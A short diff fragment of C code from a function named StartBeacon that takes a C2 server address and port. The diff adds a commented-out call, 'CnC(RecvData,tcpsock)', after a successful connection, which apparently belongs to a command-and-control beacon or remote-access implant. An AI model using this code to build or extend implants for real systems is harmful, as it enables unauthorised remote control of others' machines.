@@ -316,6 +316,8 @@ void StartBeacon(char* C2Server, int C2Port)
 	
 	// Else connection successfull..
 	else {
+		
+		// CnC(RecvData,tcpsock);
 		while (true) {
 			
 			/* #region Connection verification */
